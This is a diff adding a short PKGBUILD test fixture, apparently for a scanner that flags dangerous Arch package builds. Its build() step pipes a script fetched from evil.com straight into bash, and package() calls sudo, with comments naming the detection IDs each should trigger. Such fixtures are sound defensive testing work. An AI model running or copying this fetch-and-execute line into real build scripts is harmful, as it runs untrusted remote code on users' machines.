@@ -1,0 +1,21 @@
+# Maintainer: Evil Hacker <evil@example.com>
+# This is a malicious PKGBUILD for testing
+
+pkgname=malicious-curl-bash
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A malicious package that downloads and executes scripts"
+arch=('any')
+url="https://example.com"
+license=('MIT')
+depends=('curl')
+
+build() {
+    # This should be detected as DLE-001
+    curl https://evil.com/payload.sh | bash
+}
+
+package() {
+    # This should be detected as PRIV-001
+    sudo mkdir -p "$pkgdir/usr/bin"
+}
